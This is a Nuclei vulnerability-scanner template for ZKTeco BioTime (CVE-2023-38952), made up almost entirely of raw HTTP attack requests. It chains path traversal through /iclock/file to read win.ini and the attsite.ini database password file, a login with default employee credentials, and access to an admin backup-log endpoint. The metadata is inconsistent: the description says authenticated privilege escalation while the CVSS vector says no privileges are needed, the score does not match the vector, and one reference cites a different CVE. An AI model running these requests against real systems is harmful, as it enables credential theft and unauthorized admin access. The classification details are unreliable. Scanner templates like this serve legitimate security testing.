id: CVE-2023-38952

info:
  name: ZKTeco BioTime <= 9.0.1 - Privilege Escalation via Insecure Session Validation
  author: riteshs4hu
  severity: high
  description: |
    Insecure access control in ZKTeco BioTime through 9.0.1 allows authenticated attackers to escalate their privileges due to the fact that session ids are not validated for the type of user accessing the application by default. Privilege restrictions between non-admin and admin users are not enforced and any authenticated user can leverage admin functions without restriction by making direct requests to administrative endpoints.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2023-38951
    - https://krashconsulting.com/fury-of-fingers-biotime-rce/
    - https://github.com/omair2084/biotime-rce-8.5.5/blob/main/biotime_enum.py
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.3
    cve-id: CVE-2023-38952
    cwe-id: CWE-552
    cpe: cpe:2.3:a:zkteco:biotime:8.5.5:::::::*
  metadata:
    verified: true
    max-request: 5
    vendor: ZKTeco
    product: BioTime
  tags: cve,biotime,zkteco,auth-bypass,priv-esc,session

http:
  - raw:
      - |
        GET /license/ HTTP/1.1
        Host: {{Hostname}}
        User-Agent: nuclei
        Accept: */*
        Connection: close

    matchers:
      - type: regex
        regex:
          - "(?i)build[: ]+[0-9\\.]+"

  - raw:
      - |
        GET /iclock/file?SN=win&url=/../../../../../../../../windows/win.ini HTTP/1.1
        Host: {{Hostname}}
        User-Agent: nuclei
        Accept: */*
        Connection: close

    matchers:
      - type: word
        words:
          - "[fonts]"
          - "for 16-bit app support"
        condition: and

  - raw:
      - |
        GET /iclock/file?SN=att&url=/../../../../../../../../biotime/attsite.ini HTTP/1.1
        Host: {{Hostname}}
        User-Agent: nuclei
        Accept: */*
        Connection: close

      - |
        GET /iclock/file?SN=att&url=/../../../../../../../../zkbiotime/attsite.ini HTTP/1.1
        Host: {{Hostname}}
        User-Agent: nuclei
        Accept: */*
        Connection: close

    matchers:
      - type: word
        words:
          - "[DATABASE]"
          - "ENGINE="
          - "PASSWORD="
        condition: and

  - raw:
      - |
        GET /login/ HTTP/1.1
        Host: {{Hostname}}
        User-Agent: nuclei
        Accept: */*
        Connection: close

    extractors:
      - type: regex
        name: csrf
        group: 1
        internal: true
        part: body
        regex:
          - "name='csrfmiddlewaretoken' value='([a-zA-Z0-9]+)'"

    cookie-reuse: true

  - raw:
      - |
        POST /login/ HTTP/1.1
        Host: {{Hostname}}
        User-Agent: nuclei
        Content-Type: application/x-www-form-urlencoded
        X-CSRFToken: {{csrf}}
        Connection: close

        username=2&password=123456&captcha=&login_user=employee

    matchers:
      - type: regex
        part: body
        regex:
          - '"ret"\s*:\s*0'

  - raw:
      - |
        GET /base/dbbackuplog/table/?page=1&limit=1 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: nuclei
        Accept: application/json
        Connection: close

    matchers:
      - type: word
        words:
          - '"backup_file"'
          - '"db_type"'
        condition: and
